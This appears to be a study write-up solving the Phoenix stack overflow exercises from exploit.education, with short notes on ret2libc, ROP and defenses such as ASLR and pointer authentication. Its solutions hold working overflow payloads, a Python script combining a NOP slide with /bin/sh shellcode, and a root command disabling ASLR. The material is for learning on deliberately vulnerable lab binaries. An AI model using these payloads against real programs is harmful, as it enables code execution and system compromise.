# Stack overflow

There is multiple way of controlling the flow of a program, by overriding some part of the memory. In this section we will focus on stack memory overflow.

For those examples, you will need to install Phoenix: https://exploit.education/phoenix/getting-started/

## Stack Zero

### Exercise

Description: https://exploit.education/phoenix/stack-zero/

### Solution

`gets` function does not limit the buffer size, causing a possible overflow if the provided input is larger than the buffer size.

The goal here is to send a content to fill the buffer, and override the `changeme` variable that is located next to the end of the `buffer` in the stack.

```
$ ./stack-zero 
Welcome to phoenix/stack-zero, brought to you by https://exploit.education
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
Well done, the 'changeme' variable has been changed!
```

## Stack One

### Exercise

Description: https://exploit.education/phoenix/stack-one/

### Solution

The solution is similar to the previous exercise, but we have to control the value we assign to the variable `changeme`.

```
$ ./stack-one HELLO
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Getting closer! changeme is currently 0x00000000, we want 0x496c5962

$ ./stack-one `python -c 'print ("A"*64)+"\x62\x59\x6c\x49" '`
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
```

## Stack Two

### Exercise

Description: https://exploit.education/phoenix/stack-two/

### Solution

The solution is similar to the previous exercise, but we have to control the value we assign to the variable `changeme`. (using an environment variable)

```
$ ExploitEducation=HELLO ./stack-two
Welcome to phoenix/stack-two, brought to you by https://exploit.education
Almost! changeme is currently 0x00000000, we want 0x0d0a090a

$ ExploitEducation=`python -c 'print ("A"*64)+"\x0a\x09\x0a\x0d"'` ./stack-two
Welcome to phoenix/stack-two, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
```

## Stack Three

### Exercise

Description: https://exploit.education/phoenix/stack-three/

### Solution

The solution is similar to the previous exercise, but we have to control the address the function pointer `fp` will call.

We will assign it to the `complete_level` function (located at `0x0040069d`)

```
$ gdb ./stack-three
(gdb) info functions 
…
0x000000000040069d  complete_level
0x00000000004006b5  main
…

$ python -c 'print ("A"*64)+"\x9d\x06\x40" ' | ./stack-three 
Welcome to phoenix/stack-three, brought to you by https://exploit.education
calling function pointer @ 0x40069d
Congratulations, you've finished phoenix/stack-three :-) Well done!
```

## Stack Four

### Exercise

Description: https://exploit.education/phoenix/stack-four/

### Solution

The solution is similar to the previous exercise, but we have to control the control flow by overriding the `rip` address after returning from the main function.

This address is stored at the begging of the stack frame. (See `0x04 - CPU` for more information)

We will assign it to the `complete_level` function (located at `0x0040069d`)

```
$ gdb ./stack-four 
(gdb) info functions 
...
0x000000000040061d  complete_level
0x0000000000400635  start_level
…

$ python -c 'print ("A"*88)+"\x1d\x06\x40\x00\x00\x00\x00\x00" ' | ./stack-four
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!
```

## Stack Five

### Exercise

Description: https://exploit.education/phoenix/stack-five/

### Solution

The goal of this challenge is to execute some code from the stack. To proceed, we will have to inject valid assembler code in the stack, update `rip` to point to it.

Some piece of assembler, named `shellcode` are available in `shell storm`. They are designed to take control of the program workflow, by creating, by example, a remote shell.

In this challenge, we will use the following one: http://shell-storm.org/shellcode/files/shellcode-806.php

From an execution to another, the Stack content can be different. To avoid, jumping to the wrong address, we use the `nop slide` technique: https://en.wikipedia.org/wiki/NOP_slide

First, you need to disable stack address randomization: (root)
```
sudo -i
# echo 0 > /proc/sys/kernel/randomize_va_space
```

```
$ gdb ./stack-five

(gdb) set disassembly-flavor intel

(gdb) disassemble start_level
Dump of assembler code for function start_level:
   0x000000000040058d <+0>:     push   rbp
   0x000000000040058e <+1>:     mov    rbp,rsp
   0x0000000000400591 <+4>:     add    rsp,0xffffffffffffff80
   0x0000000000400595 <+8>:     lea    rax,[rbp-0x80]
   0x0000000000400599 <+12>:    mov    rdi,rax
   0x000000000040059c <+15>:    call   0x4003f0 <gets@plt>
   0x00000000004005a1 <+20>:    nop
   0x00000000004005a2 <+21>:    leave
   0x00000000004005a3 <+22>:    ret
End of assembler dump.
```

Put a breakpoint before returning to caller address:
```
(gdb) b *0x00000000004005a3
Breakpoint 1 at 0x4005a3

(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>x/i $rip
>x/8wx $rsp
>end

(gdb) r

The top of the stack is located at `0x7fffffffe4e8`.

```
(gdb) r

Welcome to phoenix/stack-five, brought to you by https://exploit.education
AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGHHHHHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQRRRRRRRRSSSSSSSSTTTTTTTT

Program received signal SIGSEGV, Segmentation fault.
=> 0x4005a3 <start_level+22>:   ret
0x7fffffffe4e8: 0x52525151      0x52525252      0x53535252      0x53535353

0x00000000004005a3 in start_level ()
```

We notice that the program will jump to `RRQQ` (`0x52525151`).

We will then prepare a payload according to this structure:  
`{buffer}{return_address}{nop_slide}{shellcode}` (where **return_address** should point to the **nop_slide**).

```python
import struct

# Fill buffer until %RIP
buffer_data  = "AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGG"
buffer_data += "HHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNN"
buffer_data += "OOOOOOOOPPPPPPPPQQQQQQQQ"

# Encode 64 bit address
rip = struct.pack("I", 0xffffe4e8+120)
rip_2 = struct.pack("Q", 0x7fff);

# NOP slide
nop = "\x90"*200

# Shell code, creating a /bin/sh process
payload      = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7"
payload     += "\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

print buffer_data + rip + rip_2 + nop + payload
```

Then we execute our payload:

```
$ (python ~/test.py ; cat) | /opt/phoenix/amd64/stack-five

```

Congratulation !

## Stack Protection

### Return to libc

In order to prevent buffer overflow exploits, stack and heap memory spaces can be marked (or not) as executable.

To overcome this kind of limitation, you can proceed a **ret2libc** attack. This kind of attack rely on the fact that some binary instructions are already loaded with your program, in a dedicated executable memory section.

In order to exploit such behavior, you have to compose the stack as described bellow & redirect the instruction pointer to the system address:

```
+-----------------+
|     PREVIOUS    |
|  STACK   FRAME  |
+-----------------+ 
| RETURN  POINTER | <- containing the address of the system function in libc
+-----------------+ 
|  PREVIOUS  RBP  | <- can be randomized
+-----------------+ 
|      DATA       | <- containing the address of "/bin/sh" in libc
+-----------------+ 
```

Documentation: https://en.wikipedia.org/wiki/Executable_space_protection
Documentation: https://en.wikipedia.org/wiki/Return-to-libc_attack

#### Protection

Address space layout randomization (ASLR), enables to make this kind of attack harder, as the address where the libc is loaded can vary from an execution to another.

Documentation: https://en.wikipedia.org/wiki/Address_space_layout_randomization

### ROP (Gadgets)

The goal of this attack (similar to ret2libc), is to redirect the execution flow, over several program sections that enable code execution, by chaining small portion of instructions.

Project: https://github.com/JonathanSalwan/ROPgadget
Documentation: https://en.wikipedia.org/wiki/Return-oriented_programming

#### Protection

As possible protections against those attacks:
* the compiled code could be randomized or avoid using `call`/`ret` instructions.
* Pointer Authentication Codes (PAC), provides a protection by authenticating pointers by signing those using unused bits.
